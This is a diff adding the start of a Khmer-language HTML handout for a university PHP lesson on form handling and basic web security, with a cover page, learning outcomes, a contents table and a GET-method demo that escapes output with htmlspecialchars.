@@ -1,0 +1,1786 @@
+
+
+<!DOCTYPE html>
+<html lang="km">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Handout: មេរៀនទី ៤ - Form Handling & Basic Web Security (PHP 8 Modern Development)</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Moul&family=Siemreab&family=Inter:wght@400;500;600;700;800&family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary: #0F172A;
+            --secondary: #0078D4;
+            --accent: #4F46E5;
+            --php-color: #7C3AED;
+            --mysql-color: #0284C7;
+            --apache-color: #D97706;
+            --success: #059669;
+            --warning: #D97706;
+            --danger: #DC2626;
+            
+            --text-main: #1E293B;
+            --text-heading: #0F172A;
+            --text-muted: #475569;
+            
+            --bg-page: #FFFFFF;
+            --bg-workspace: #0F172A;
+            --bg-light: #F8FAFC;
+            --bg-card: #FFFFFF;
+            
+            /* LIGHT PHP CODE EDITOR THEME (EASY READ & PRINT FRIENDLY) */
+            --bg-code-light: #F8FAFC;
+            --code-header-light: #E2E8F0;
+            --code-text: #0F172A;
+            --code-kw: #7C3AED;       /* Purple: if, else, return, match, foreach, exit */
+            --code-tag: #0284C7;      /* Blue: <?php, string, int, float, void, array, bool */
+            --code-var: #0F172A;      /* Dark Slate: $_POST, $_GET, $errors, $name */
+            --code-str: #B45309;      /* Brown/Amber: "Hello World" */
+            --code-num: #059669;      /* Emerald Green: 100, 3.14 */
+            --code-func: #2563EB;     /* Royal Blue: htmlspecialchars, filter_input, trim, filter_var */
+            --code-cmt: #64748B;      /* Gray Italic: // comment */
+            
+            --bg-output: #F1F5F9;
+            --border-light: #E2E8F0;
+            --border-dark: #CBD5E1;
+            
+            --font-kh-heading: 'Khmer OS Muol Light', 'Moul', serif;
+            --font-kh-body: 'Khmer OS Siemreab', 'Siemreab', sans-serif;
+            --font-en-main: 'Inter', sans-serif;
+            --font-code: 'Consolas', 'Fira Code', monospace;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background-color: var(--bg-workspace);
+            font-family: var(--font-kh-body);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 25px 10px;
+            line-height: 1.6;
+            font-size: 11pt;
+        }
+
+        /* Top Bar */
+        .no-print-bar {
+            background: #FFFFFF;
+            border: 1px solid var(--border-dark);
+            padding: 14px 28px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            width: 210mm;
+            max-width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
+        }
+        .no-print-bar p { margin: 0; font-size: 11pt; color: var(--text-muted); }
+        .print-btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-family: var(--font-kh-body);
+            font-size: 11pt;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3);
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .print-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(79, 70, 229, 0.4); }
+
+        /* A4 Page Layout */
+        .a4-page {
+            width: 210mm;
+            min-height: 297mm;
+            background: var(--bg-page);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.25);
+            margin-bottom: 25px;
+            position: relative;
+            border-radius: 4px;
+            page-break-after: always;
+            box-sizing: border-box;
+            padding: 12mm 15mm;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .global-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 12px;
+            border-bottom: 3px solid var(--accent);
+            background-color: var(--bg-light);
+            border-radius: 6px;
+            margin-bottom: 12px;
+            page-break-inside: avoid;
+        }
+        .header-item { display: flex; flex-direction: column; align-items: center; gap: 2px; width: 140px; }
+        .header-item img { height: 32px; object-fit: contain; }
+        .header-item span { font-size: 8.5pt; font-weight: bold; color: var(--accent); text-align: center; font-family: var(--font-kh-heading); line-height: 1.2; }
+        .header-text { flex-grow: 1; text-align: center; padding: 0 10px; }
+        .header-text h1 { font-family: var(--font-kh-heading); font-size: 11pt; color: var(--accent); margin-bottom: 1px; line-height: 1.3;}
+        .header-text p { font-family: var(--font-en-main); font-size: 7.5pt; color: var(--text-muted); font-weight: 700; letter-spacing: 1px; text-transform: uppercase;}
+
+        .global-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 2px solid var(--accent);
+            background-color: var(--bg-light);
+            padding: 5px 12px;
+            border-radius: 6px;
+            margin-top: 12px;
+            page-break-inside: avoid;
+        }
+        .footer-left { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            font-size: 9.5pt; 
+            color: var(--text-heading); 
+            font-weight: bold;
+            font-family: var(--font-kh-heading);
+        }
+        .footer-avatar {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--accent);
+        }
+        .footer-right { font-size: 8.5pt; color: white; font-weight: 700; background: var(--accent); padding: 2px 10px; border-radius: 15px; font-family: var(--font-kh-body);}
+
+        .page-content { 
+            flex-grow: 1; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: flex-start; 
+        }
+
+        .section-title {
+            border-bottom: 2px solid var(--accent);
+            padding-bottom: 4px;
+            margin: 8px 0 10px 0;
+            font-family: var(--font-kh-heading);
+            font-size: 12pt;
+            color: var(--text-heading);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            page-break-inside: avoid;
+        }
+        .section-title i { color: var(--accent); }
+        
+        .sub-heading { 
+            font-family: var(--font-kh-heading); 
+            font-size: 11pt; 
+            color: var(--accent); 
+            margin: 8px 0 6px 0; 
+            page-break-inside: avoid;
+            border-left: 4px solid var(--accent);
+            padding-left: 8px;
+            line-height: 1.4;
+        }
+
+        .topic-toc-box {
+            background: #F1F5F9;
+            border: 1px solid var(--border-dark);
+            border-left: 4px solid var(--accent);
+            border-radius: 6px;
+            padding: 6px 12px;
+            margin: 4px 0 8px 0;
+            font-size: 10pt;
+            page-break-inside: avoid;
+        }
+        .topic-toc-title {
+            font-family: var(--font-kh-heading);
+            font-size: 9.5pt;
+            color: var(--accent);
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .topic-toc-box ul {
+            list-style: none;
+            padding-left: 6px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4px;
+        }
+        .topic-toc-box li { color: var(--text-main); font-size: 9.5pt; }
+        .topic-toc-box li b { color: var(--secondary); font-family: var(--font-en-main); }
+
+        .text-block { font-size: 10.5pt; line-height: 1.5; margin-bottom: 6px; text-align: justify; }
+        .highlight { color: var(--accent); font-weight: 700; }
+        
+        /* BLOOM'S TAXONOMY BADGES */
+        .bloom-tag { display: inline-block; padding: 2px 7px; border-radius: 4px; font-size: 7.5pt; font-weight: 800; font-family: var(--font-en-main); margin-right: 4px; text-transform: uppercase; letter-spacing: 0.5px;}
+        .bloom-c1 { background: #E0F2FE; color: #0369A1; border: 1px solid #BAE6FD; } 
+        .bloom-c2 { background: #FEF3C7; color: #B45309; border: 1px solid #FDE68A; } 
+        .bloom-c3 { background: #DCFCE7; color: #15803D; border: 1px solid #BBF7D0; } 
+        .bloom-c4 { background: #F3E8FF; color: #6B21A8; border: 1px solid #E9D5FF; } 
+        .bloom-c5 { background: #FFE4E6; color: #BE123C; border: 1px solid #FECDD3; } 
+        .bloom-c6 { background: #E0E7FF; color: #3730A3; border: 1px solid #C7D2FE; } 
+
+        .toc-table { width: 100%; border-collapse: collapse; margin: 6px 0; border: 1px solid var(--border-light); border-radius: 6px; overflow: hidden; page-break-inside: avoid; }
+        .toc-table th { background: var(--accent); color: white; font-family: var(--font-kh-heading); font-size: 9.5pt; padding: 6px 8px; text-align: left; }
+        .toc-table td { padding: 5px 8px; border-bottom: 1px solid var(--border-light); font-size: 10pt; color: var(--text-main); }
+        .toc-num { font-weight: bold; width: 10%; text-align: center; color: var(--accent); }
+
+        .obj-list { list-style: none; padding-left: 0; margin-top: 4px; }
+        .obj-list li { position: relative; padding-left: 18px; margin-bottom: 6px; font-size: 10.5pt; line-height: 1.5; page-break-inside: avoid; }
+        .obj-list li::before { content: '▸'; position: absolute; left: 0; color: var(--accent); font-size: 11pt; top: -1px; }
+
+        table.standard-table { width: 100%; border-collapse: collapse; margin-bottom: 8px; border: 1px solid var(--border-dark); page-break-inside: avoid; }
+        table.standard-table th, table.standard-table td { border: 1px solid var(--border-dark); padding: 5px 7px; text-align: left; vertical-align: middle; }
+        table.standard-table th { background: var(--accent); color: white; font-family: var(--font-kh-heading); font-size: 9.5pt; text-align: center; }
+        table.standard-table td { font-size: 10pt; line-height: 1.4; }
+
+        .sub-topic-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-dark);
+            border-radius: 6px;
+            padding: 10px 14px;
+            margin-bottom: 10px;
+            page-break-inside: avoid;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+        }
+        .sub-topic-card h4 {
+            font-family: var(--font-kh-heading);
+            font-size: 10.5pt;
+            color: var(--primary);
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border-bottom: 1px solid var(--border-light);
+            padding-bottom: 4px;
+        }
+        .content-label {
+            font-weight: bold;
+            color: var(--accent);
+            font-family: var(--font-kh-heading);
+            font-size: 9.5pt;
+            margin-top: 6px;
+            margin-bottom: 2px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .syntax-box {
+            background: #EEF2FF;
+            border-left: 4px solid var(--accent);
+            font-family: var(--font-code);
+            font-size: 9pt;
+            padding: 6px 10px;
+            margin: 4px 0;
+            border-radius: 0 4px 4px 0;
+            color: #1E1B4B;
+            white-space: pre-wrap;
+            font-weight: 600;
+        }
+
+        .code-window { 
+            background: var(--bg-code-light); 
+            border-radius: 6px; 
+            overflow: hidden; 
+            margin: 5px 0; 
+            border: 1px solid var(--border-dark); 
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            page-break-inside: avoid;
+        }
+        .code-header { 
+            background: var(--code-header-light); 
+            padding: 4px 12px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            border-bottom: 1px solid var(--border-dark);
+        }
+        .mac-dots { display: flex; gap: 5px; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; }
+        .dot-r { background: #FF5F56; }
+        .dot-y { background: #FFBD2E; }
+        .dot-g { background: #27C93F; }
+        .code-title { color: #475569; font-family: var(--font-code); font-size: 8.5pt; font-weight: 700;}
+        pre { 
+            padding: 8px 12px; 
+            color: var(--code-text); 
+            font-family: var(--font-code); 
+            font-size: 8.8pt; 
+            line-height: 1.45; 
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin: 0; 
+            tab-size: 4;
+            font-weight: 600;
+        }
+
+        /* Light Theme Syntax Highlight Classes */
+        .cv-tag { color: var(--code-tag); font-weight: bold; }
+        .cv-kw { color: var(--code-kw); font-weight: bold; }
+        .cv-var { color: var(--code-var); }
+        .cv-str { color: var(--code-str); }
+        .cv-num { color: var(--code-num); }
+        .cv-fn { color: var(--code-func); font-weight: bold; }
+        .cv-cm { color: var(--code-cmt); font-style: italic; }
+
+        .output-window {
+            background: var(--bg-output);
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 4px 0;
+            border: 1px solid var(--border-dark);
+            page-break-inside: avoid;
+        }
+        .output-header {
+            background: #CBD5E1;
+            padding: 3px 10px;
+            color: #0F172A;
+            font-family: var(--font-code);
+            font-size: 7.5pt;
+            font-weight: 700;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            border-bottom: 1px solid #94A3B8;
+        }
+        .output-body {
+            padding: 6px 12px;
+            color: #0078D4;
+            font-family: var(--font-code);
+            font-size: 8.8pt;
+            line-height: 1.4;
+            white-space: pre-wrap;
+            font-weight: 600;
+        }
+
+        .extra-box {
+            background: #FFFBEB;
+            border-left: 4px solid var(--warning);
+            border: 1px solid #FDE68A;
+            border-left-width: 4px;
+            border-radius: 4px;
+            padding: 6px 10px;
+            margin-top: 6px;
+            font-size: 9.5pt;
+            line-height: 1.45;
+            page-break-inside: avoid;
+        }
+        .extra-box-title {
+            font-weight: bold;
+            color: #B45309;
+            font-family: var(--font-kh-heading);
+            font-size: 9pt;
+            margin-bottom: 2px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .q-list { 
+            list-style-type: khmer; 
+            padding-left: 24px; 
+            font-size: 10.5pt; 
+            line-height: 1.5; 
+        }
+        .q-list li { 
+            margin-bottom: 6px; 
+            font-weight: normal; 
+            color: var(--text-main); 
+            page-break-inside: avoid;
+        }
+        .mcq-opts { 
+            list-style-type: none; 
+            padding-left: 0; 
+            margin-top: 3px; 
+            font-weight: normal; 
+            display: grid; 
+            grid-template-columns: 1fr 1fr; 
+            gap: 4px;
+        }
+        .mcq-opts li { 
+            font-size: 9.5pt; 
+            background: #F8FAFC; 
+            padding: 3px 6px; 
+            border-radius: 4px; 
+            border: 1px solid var(--border-light); 
+            margin-bottom: 0; 
+        }
+        
+        .ans-table { width: 100%; border-collapse: collapse; margin-bottom: 6px; page-break-inside: avoid;}
+        .ans-table th { background: #F1F5F9; border: 1px solid var(--border-dark); padding: 3px; font-size: 8.5pt; font-weight: bold; color: var(--text-heading); text-align:center;}
+        .ans-table td { font-weight: 700; color: var(--accent); text-align: center; border: 1px solid var(--border-dark); padding: 3px; font-size: 8.5pt;}
+
+        .matching-table { width: 100%; border-collapse: collapse; margin: 4px 0; border: 1px solid var(--border-dark); page-break-inside: avoid;}
+        .matching-table th { background: #E0E7FF; color: var(--accent); border: 1px solid var(--border-dark); padding: 5px; font-size: 9.5pt; text-align: center; font-family: var(--font-kh-heading); }
+        .matching-table td { border: 1px solid var(--border-dark); padding: 5px 8px; font-size: 9.5pt; line-height: 1.4; vertical-align: top; }
+
+        .explain-ans-card {
+            background: #F8FAFC;
+            border-left: 4px solid var(--accent);
+            border: 1px solid var(--border-dark);
+            border-left-width: 4px;
+            border-radius: 4px;
+            padding: 6px 10px;
+            margin-bottom: 8px;
+            page-break-inside: avoid;
+        }
+        .explain-ans-card h5 {
+            font-family: var(--font-kh-heading);
+            font-size: 9.5pt;
+            color: var(--primary);
+            margin-bottom: 3px;
+        }
+
+        .tech-badge-bar {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 10px 0;
+            flex-wrap: wrap;
+        }
+        .tech-badge {
+            background: #EEF2FF;
+            border: 1px solid #C7D2FE;
+            color: var(--accent);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 8.5pt;
+            font-weight: bold;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* MOBILE & RESPONSIVE DESIGN */
+        @media screen and (max-width: 850px) {
+            body { padding: 10px 5px; }
+            .no-print-bar { width: 100%; flex-direction: column; gap: 10px; text-align: center; }
+            .a4-page {
+                width: 100% !important;
+                max-width: 100% !important;
+                min-height: auto !important;
+                padding: 15px 12px !important;
+                margin-bottom: 15px !important;
+                border-radius: 8px !important;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.1) !important;
+            }
+            .global-header { flex-direction: column; text-align: center; gap: 8px; }
+            .header-item { width: 100%; }
+            .mcq-opts, .topic-toc-box ul { grid-template-columns: 1fr !important; }
+            table.standard-table, table.matching-table, table.toc-table {
+                display: block;
+                overflow-x: auto;
+                white-space: nowrap;
+            }
+        }
+
+        /* PRINT SPECIFIC STYLES */
+        @media print {
+            body { background: none; padding: 0; margin: 0; display: block; }
+            .no-print-bar { display: none !important; }
+            @page { size: A4 portrait; margin: 0; }
+            .a4-page { width: 210mm !important; margin: 0 !important; box-shadow: none !important; border: none !important; border-radius: 0 !important; }
+            * { -webkit-print-color-adjust: exact !important; print-color-adjust: exact !important; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="no-print-bar">
+    <p><b><i class="fa-solid fa-file-pdf text-blue"></i> ណែនាំបោះពុម្ព៖</b> សូមជ្រើសរើស <b>Margins: None</b> និងបើក <b>Background graphics</b> ពេល Print ជា PDF។</p>
+    <button class="print-btn" onclick="window.print()"><i class="fa-solid fa-print"></i> បោះពុម្ពឯកសារជា PDF</button>
+</div>
+
+<!-- PAGE 1: COVER PAGE -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>សាកលវិទ្យាល័យអង្គរ | ANGKOR UNIVERSITY</h1><p>FACULTY OF SCIENCE & TECHNOLOGY</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content" style="justify-content: center; align-items: center; text-align: center; background: radial-gradient(circle at top, #EEF2FF 0%, #FFFFFF 100%); border-radius: 8px;">
+        <img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" style="width: 120px; margin-bottom: 12px; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.1));" alt="Logo">
+        <h1 style="font-family: var(--font-kh-heading); font-size: 20pt; color: var(--text-heading); margin-bottom: 2px;">សាកលវិទ្យាល័យអង្គរ</h1>
+        <p style="font-family: 'Inter'; font-size: 10pt; color: var(--text-muted); margin-bottom: 12px; font-weight: 700; letter-spacing: 2px;">ANGKOR UNIVERSITY</p>
+        
+        <div class="tech-badge-bar">
+            <span class="tech-badge"><i class="fa-brands fa-wpforms"></i> HTTP GET & POST Superglobals</span>
+            <span class="tech-badge"><i class="fa-solid fa-check-double"></i> Server-Side Form Validation</span>
+            <span class="tech-badge"><i class="fa-solid fa-shield-halved"></i> XSS Defense & Sanitization</span>
+        </div>
+
+        <div style="font-family: var(--font-kh-heading); font-size: 10.5pt; color: var(--text-main); margin-bottom: 14px; background: #F1F5F9; padding: 5px 18px; border-radius: 50px; border: 1px solid var(--border-light); display: inline-flex; align-items: center; gap: 8px;">
+            <i class="fa-solid fa-graduation-cap" style="color:var(--accent);"></i> បរិញ្ញាបត្រ វិទ្យាសាស្ត្រកុំព្យូទ័រ / បច្ចេកវិទ្យាព័ត៌មាន (CS / IT)
+        </div>
+        
+        <div style="background: var(--accent); color: white; padding: 8px 20px; border-radius: 8px; font-size: 12pt; font-family: var(--font-kh-heading); margin-bottom: 12px; box-shadow: 0 4px 15px rgba(79, 70, 229, 0.3);">ឯកសារអាន (Handout) - មេរៀនទី ៤ (Professional & Academic Edition)</div>
+        
+        <h2 style="font-family: var(--font-kh-heading); font-size: 16pt; color: var(--text-heading); margin-bottom: 8px; line-height: 1.4;">Form Handling & Basic Web Security<br>(ការគ្រប់គ្រង Form & Web Security មូលដ្ឋាន)</h2>
+        <h3 style="font-family: var(--font-kh-body); font-size: 11pt; color: var(--secondary); margin-bottom: 18px; font-weight: 600;">HTTP Methods (GET/POST), Superglobals ($_GET, $_POST, $_SERVER), Server-Side Validation, Sticky Controls, XSS Defense (htmlspecialchars), Data Filtering & PRG Pattern</h3>
+        
+        <div style="display: flex; flex-direction: column; align-items: center; gap: 6px; background: white; padding: 12px 25px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.06); border: 1px solid var(--border-light); width: 85%;">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" style="width: 75px; height: 75px; border-radius: 50%; object-fit: cover; border: 3px solid var(--accent); box-shadow: 0 4px 10px rgba(0,0,0,0.1);" alt="Prof">
+            <p style="font-family: var(--font-kh-body); font-size: 10pt; color: var(--text-muted); margin: 0;">រៀបចំដោយសាស្ត្រាចារ្យ៖</p>
+            <strong style="font-family: var(--font-kh-heading); color: var(--text-heading); font-size: 11.5pt;">សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</strong>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 2: LLO & TOC -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="section-title"><i class="fa-solid fa-graduation-cap"></i> ១. លទ្ធផលរំពឹងទុកនៃមេរៀន (Lesson Learning Outcomes - LLO)</div>
+        <ul class="obj-list">
+            <li><b>LLO 4.1:</b> <span class="bloom-tag bloom-c1">C1 - Remember</span> <span class="bloom-tag bloom-c2">C2 - Understand</span> <span class="highlight">បកស្រាយ និងប្រៀបធៀប</span> ស្ថាបត្យកម្ម HTTP Request Methods (`GET` ធៀបនឹង `POST`) ព្រមទាំងការប្រមូលទិន្នន័យតាមរយៈ PHP Superglobals (`$_GET`, `$_POST`, `$_SERVER['REQUEST_METHOD']`)។</li>
+            <li><b>LLO 4.2:</b> <span class="bloom-tag bloom-c3">C3 - Apply</span> <span class="highlight">អនុវត្ត</span> ការធ្វើ **Server-Side Form Validation** ត្រួតពិនិត្យទិន្នន័យទទេ, ប្រវែងអក្សរ, ទម្រង់ អ៊ីមែល, និងបង្កើត **Sticky Form** (Text, Radio, Checkbox, Select) ដើម្បីរក្សាទុកតម្លៃបញ្ចូលចាស់។</li>
+            <li><b>LLO 4.3:</b> <span class="bloom-tag bloom-c4">C4 - Analyze</span> <span class="highlight">វិភាគ និងទប់ស្កាត់</span> ការវាយប្រហារផ្នែកសុវត្ថិភាព **XSS (Cross-Site Scripting)** ដោយប្រើប្រាស់ `htmlspecialchars()`, `trim()`, និង Filter Functions ទំនើបរបស់ PHP (`filter_input()`, `filter_var()`)។</li>
+            <li><b>LLO 4.4:</b> <span class="bloom-tag bloom-c5">C5 - Evaluate</span> <span class="highlight">វាយតម្លៃ</span> រចនាសម្ព័ន្ធ Form Processing និងអនុវត្ត **PRG Pattern (Post/Redirect/Get)** ដើម្បីទប់ស្កាត់បញ្ហា Form Resubmission ពេល Refresh Browser។</li>
+            <li><b>LLO 4.5:</b> <span class="bloom-tag bloom-c6">C6 - Create</span> <span class="highlight">បង្កើត</span> កម្មវិធី Form Processing ពេញលេញមួយដែលមានប្រព័ន្ធ Validation, Security Sanitization, Error Feedback, និង UI ស្អាតបាតតាមស្តង់ដារ PHP 8 Modern Web Application។</li>
+        </ul>
+
+        <div class="section-title" style="margin-top:12px;"><i class="fa-solid fa-list-ol"></i> ២. មាតិកានៃមេរៀន (Lesson Contents)</div>
+        <table class="toc-table">
+            <thead>
+                <tr>
+                    <th class="toc-num">ចំណុច</th>
+                    <th>ខ្លឹមសារមេរៀន (Sub-Topics)</th>
+                    <th style="width:20%; text-align:center;">Bloom's Level</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td class="toc-num">៤.១</td><td>វិធីសាស្ត្រ HTTP Requests & PHP Superglobals (GET, POST & Request Detection)</td><td style="text-align:center;"><span class="bloom-tag bloom-c1">C1</span> <span class="bloom-tag bloom-c2">C2</span></td></tr>
+                <tr><td class="toc-num">៤.២</td><td>ការធ្វើ Form Validation & Sticky Controls (Server Validation & State Preservation)</td><td style="text-align:center;"><span class="bloom-tag bloom-c2">C2</span> <span class="bloom-tag bloom-c3">C3</span></td></tr>
+                <tr><td class="toc-num">៤.៣</td><td>សុវត្ថិភាព Web & Sanitization Pipeline (XSS Prevention, htmlspecialchars & filter_input)</td><td style="text-align:center;"><span class="bloom-tag bloom-c3">C3</span> <span class="bloom-tag bloom-c4">C4</span></td></tr>
+                <tr><td class="toc-num">៤.៤</td><td>ស្ថាបត្យកម្ម Form Processing ទំនើប (Single-File Architecture, PRG Pattern & Feedback Routing)</td><td style="text-align:center;"><span class="bloom-tag bloom-c4">C4</span> <span class="bloom-tag bloom-c5">C5</span> <span class="bloom-tag bloom-c6">C6</span></td></tr>
+            </tbody>
+        </table>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ២ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 3: SECTION 4.1.1 GET METHOD -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="section-title" style="margin-top:0;">
+            <i class="fa-solid fa-book-open text-blue"></i> ៣. ខ្លឹមសារលម្អិតនៃមេរៀន (Detailed Lesson Contents)
+        </div>
+
+        <div class="sub-heading"><i class="fa-solid fa-globe"></i> ៤.១ វិធីសាស្ត្រ HTTP Requests & PHP Superglobals <span class="bloom-tag bloom-c1">C1</span> <span class="bloom-tag bloom-c2">C2</span></div>
+
+        <!-- 4.1.1 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-link text-blue"></i> ៤.១.១ HTTP GET Method & <code>$_GET</code> Superglobal <span class="bloom-tag bloom-c1">C1</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block"><b>HTTP GET Method</b> គឺជាវិធីសាស្ត្រផ្ញើទិន្នន័យពី Client ទៅកាន់ Server ដោយបង្ហាញទិន្នន័យចំហរនៅលើ <b>URL Query String</b> (ឧទាហរណ៍៖ <code>search.php?keyword=PHP8&page=2</code>)។ ទិន្នន័យត្រូវបានរក្សាទុកក្នុង Associative Array ឈ្មោះថា <code>$_GET</code>។ វិធីសាស្ត្រនេះស័ក្តិសមសម្រាប់ Form ស្វែងរក (Search), Pagination, និងការ Filter ទិន្នន័យ ដែលអនុញ្ញាតឱ្យ User អាច Bookmark ទុក URL បាន។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">&lt;!-- HTML Form --&gt;
+&lt;form method="GET" action="target.php"&gt;
+    &lt;input type="text" name="param_name"&gt;
+&lt;/form&gt;
+
+// PHP Code Accessing GET Parameter
+$value = $_GET['param_name'] ?? 'default_value';</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">get_method_demo.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-cm">// ចាប់យកទិន្នន័យពី GET Query String ដោយប្រើ Null Coalescing Operator (??)</span>
+<span class="cv-var">$keyword</span> = <span class="cv-var">$_GET</span>[<span class="cv-str">'q'</span>] ?? <span class="cv-str">''</span>;
+<span class="cv-var">$category</span> = <span class="cv-var">$_GET</span>[<span class="cv-str">'cat'</span>] ?? <span class="cv-str">'all'</span>;
+<span class="cv-tag">?&gt;</span>
+&lt;form method="GET" action="get_method_demo.php"&gt;
+    &lt;input type="text" name="q" value="<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$keyword</span>) <span class="cv-tag">?&gt;</span>" placeholder="ស្វែងរក..."&gt;
+    &lt;button type="submit"&gt;ស្វែងរក&lt;/button&gt;
+&lt;/form&gt;
+
+<span class="cv-tag">&lt;?php</span> <span class="cv-kw">if</span> (!<span class="cv-fn">empty</span>(<span class="cv-var">$keyword</span>)): <span class="cv-tag">?&gt;</span>
+    &lt;p&gt;លទ្ធផលស្វែងរកសម្រាប់៖ &lt;b&gt;<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$keyword</span>) <span class="cv-tag">?&gt;</span>&lt;/b&gt; (ប្រភេទ៖ <span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$category</span>) <span class="cv-tag">?&gt;</span>)&lt;/p&gt;
